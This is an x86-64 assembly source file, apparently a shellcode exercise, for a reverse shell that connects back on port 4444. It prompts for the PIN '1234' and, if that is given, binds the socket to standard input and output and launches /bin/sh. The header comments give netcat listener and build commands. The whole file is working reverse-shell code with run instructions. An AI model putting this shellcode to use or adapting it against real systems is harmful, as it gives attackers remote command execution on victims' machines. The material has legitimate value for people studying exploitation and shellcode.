;reverseshell which connects back on port 4444 if the correct PIN code 1234 is submitted.
; HOW TO:
; start netcat listener
; nc -l 127.0.0.1 4444

; assemble, link and run the reverse shellcode
; nasm -felf64 reverseshell.nasm -o reverseshell.o
; ld reverseshell.o -o reverseshell
; ./reverseshell

global _start:
section .text

_start:

socket:
	;sockfd = socket(AF_INET, SOCK_STREAM, 0);
	xor rdi, rdi
	mov rdx, rdi
	add rdi, 2
	xor rsi, rsi
	add rsi, 1

	xor rax, rax
	add rax, 41
	syscall

	;save the fd for other syscalls
	mov rdi, rax
	xor rax, rax

server_struct:
	push rax                         ;bzero(&server.sin_zero, 8)
	mov dword [rsp-4], eax           ;server.sin_addr.s_addr=IN_ADDR_ANY 4 bytes
	mov word [rsp-6], 0x5c11         ;server.sin_port= 4444 (0x115c) 2 bytes
	mov word [rsp-8], 0x2            ;server.sin_family=AF_INET, 2bytes
	sub rsp, 8                       ;adjusting the stack pointer to point to the start of the struct

connect:
	;connect(sockfd, (struct sockaddr *)&server, sizeof(server));
	mov rsi, rsp
	mov rdx, 16
	add rax, 42
	syscall

duplicate_sockets:
	;dup(new,old)
	xor rsi, rsi
	xor rax, rax
	mov al, 33
	syscall

	mov sil, 1
	mov al, 33
	syscall

	mov sil, 2
	mov al, 33
	syscall

write:
	;ssize_t write(int fd, const void *buf, size_t count);

	xor rdx, rdx
	add rdx, 0x6

	xor rsi, rsi
	push rsi
	mov rsi, 0x3a4e4950
	push rsi
	mov rsi, rsp

	mov rax, 0x1
	syscall

;read:
	;ssize_t read(int fd, void *buf, size_t count);
	sub rsp, 4
	mov rsi, rsp
	
	xor rdx, rdx
	add rdx, 0x4

	xor rax, rax
	syscall

cmpinput:
	xor rbx, rbx
	mov bl, byte [rsp]
	xor rcx, rcx
	mov rcx, 0x31
	cmp rbx, rcx
	jne exit

	mov bl, byte [rsp+1]
	mov rcx, 0x32
	cmp rbx, rcx
	jne exit

	mov bl, byte [rsp+2]
	mov rcx, 0x33
        cmp rbx, rcx
        jne exit

	mov bl, byte [rsp+3]
	mov rcx, 0x34
        cmp rbx, rcx
        je execve

exit:
        xor rdi, rdi
        xor rax, rax
        add rax, 60
        syscall

execve:
	;int execve(const char *filename, char *const argv[], char *const envp[]);
	xor rdi, rdi
	xor rax,rax
	push rax
	
	mov rbx, 0x68732f6e69622f
	push rbx
	mov rdi, rsp

	push rax
	mov rdx, rsp

	push rdi
	mov rsi, rsp

	add rax, 59
	syscall
